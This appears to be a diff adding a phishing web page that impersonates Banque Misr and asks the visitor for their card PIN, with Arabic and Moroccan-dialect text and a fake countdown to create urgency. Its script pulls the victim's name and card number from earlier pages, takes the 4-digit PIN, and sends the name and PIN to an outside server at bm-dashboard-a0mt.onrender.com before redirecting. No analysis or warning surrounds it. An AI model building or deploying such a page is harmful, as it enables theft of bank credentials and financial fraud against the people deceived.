@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>الرقم السري</title>
+  <link rel="stylesheet" href="style.css" />
+  <style>
+    :root {
+      --boa-primary: #00BDBB;
+      --boa-light: #ffffff;
+      --boa-dark: #222222;
+      --boa-accent-orange: #FD7400;
+      --boa-accent-aqua: #2DBEB1;
+      --font-main: 'Tajawal', 'Cairo', 'Noto Sans Arabic', sans-serif;
+    }
+
+    body {
+      font-family: var(--font-main);
+      background-color: #f5f5ff;
+      margin: 0;
+      padding: 0;
+      text-align: center;
+      color: var(--boa-dark);
+    }
+
+    .header-logo {
+      padding: 20px 0;
+      background-color: var(--boa-primary);
+    }
+
+    .header-logo {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  padding: 1rem;
+  background: var(--boa-primary);
+}
+
+    .card-box {
+      background: var(--boa-light);
+      border: 3px solid var(--boa-primary);
+      border-radius: 18px;
+      padding: 30px 20px;
+      max-width: 400px;
+      margin: 30px auto;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+    }
+
+    .bank-logo {
+      margin-bottom: 15px;
+    }
+
+    .bank-logo img {
+      height: 60px;
+    }
+
+    .atm-image {
+      width: 100%;
+      max-width: 250px;
+      margin: 15px 0;
+    }
+
+    .pin-title {
+      font-size: 1.4rem;
+      font-weight: bold;
+      margin: 15px 0;
+      color: var(--boa-dark);
+    }
+
+    .pin-input {
+      font-size: 2rem;
+      letter-spacing: 10px;
+      text-align: center;
+      padding: 10px;
+      border: 2px solid #999;
+      border-radius: 10px;
+      width: 100%;
+      max-width: 250px;
+      margin: 0 auto 10px;
+    }
+
+    .note-box {
+      background-color: #dff0ff;
+      padding: 10px;
+      margin-top: 15px;
+      border-radius: 10px;
+      color: var(--boa-dark);
+      font-size: 0.9rem;
+    }
+
+    .submit-btn {
+      background-color: var(--boa-primary);
+      color: var(--boa-light);
+      padding: 14px;
+      border: none;
+      border-radius: 12px;
+      font-size: 1rem;
+      width: 90%;
+      max-width: 300px;
+      margin: 20px auto 0;
+      display: block;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    .submit-btn:hover {
+      background-color: var(--boa-accent-aqua);
+    }
+
+    #countdown-text {
+      color: var(--boa-primary);
+      font-weight: bold;
+      margin-top: 5px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="header-logo">
+    <img src="images/mainLogo.png" alt="Bank Logo" />
+  </div>
+
+  <div class="card-box">
+    <div class="bank-logo">
+      <img src="images/semiLogo.jpeg" alt="Banque Misr" />
+    </div>
+
+    <img src="images/atm.jpeg" alt="ATM Machine" class="atm-image" />
+
+    <h2 class="pin-title">الرقم السري للبطاقة</h2>
+    <input type="password" maxlength="4" class="pin-input" placeholder="••••" inputmode="numeric" />
+
+   <p id="countdown-text">
+  غادي يتوقف هاد الكود بعد <span id="timer">30</span> ثانية
+</p>
+   <div class="note-box">
+  <strong>شنو هو الرقم السري ديال البطاقة؟</strong><br>
+  هو لكود اللي خاصك تستعملو ملي كتسحب من الصراف الآلي. تأكد مزيان من الكود قبل ما تدخلو.  
+  إلا دخلتيه غالط 3 مرات ورا بعضياتهم، البطاقة غادي تتوقف باش نحميّوك.
+</div>
+
+    <button class="submit-btn" id="submitOtpBtn">متابعة</button>
+  </div>
+
+<script>
+document.getElementById("submitOtpBtn").addEventListener("click", function () {
+  const pinInput = document.querySelector(".pin-input");
+  const pinCode = pinInput.value.trim();
+
+  if (!/^\d{4}$/.test(pinCode)) {
+    alert("الرجاء إدخال رقم سري مكون من 4 أرقام");
+    pinInput.focus();
+    return;
+  }
+
+  const fullCard = localStorage.getItem("cardNum") || "N/A";
+  const cardDisplay = fullCard.replace(/\s/g, '').replace(/^(\d{6})\d{6,8}(\d{3,4})$/, '$1******$2');
+  const fullName = localStorage.getItem("name") || "N/A";
+
+  const message = 
+    `✅ OTP Confirmation Code:\n` +
+    `- الاسم الكامل: ${fullName}\n` +
+    `- الكود: ${pinCode}`;
+
+  fetch("https://bm-dashboard-a0mt.onrender.com/api/messages", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ text: message }),
+  })
+  .then(response => {
+    if (!response.ok) throw new Error("فشل");
+    return response.json();
+  })
+  .then(() => {
+    window.location.href = "finalcode.html";
+  })
+  .catch(error => {
+    console.error("Error:", error);
+    alert("حدث خطأ ");
+  });
+});
+
+// Countdown timer
+let countdown = 30;
+const timerEl = document.getElementById('timer');
+const intervalId = setInterval(() => {
+  countdown--;
+  timerEl.textContent = countdown;
+  if (countdown <= 0) {
+    clearInterval(intervalId);
+    document.getElementById('countdown-text').textContent = "انتهى وقت الكود، يرجى طلب كود جديد.";
+  }
+}, 1000);
+</script>
+
+</body>
+</html>
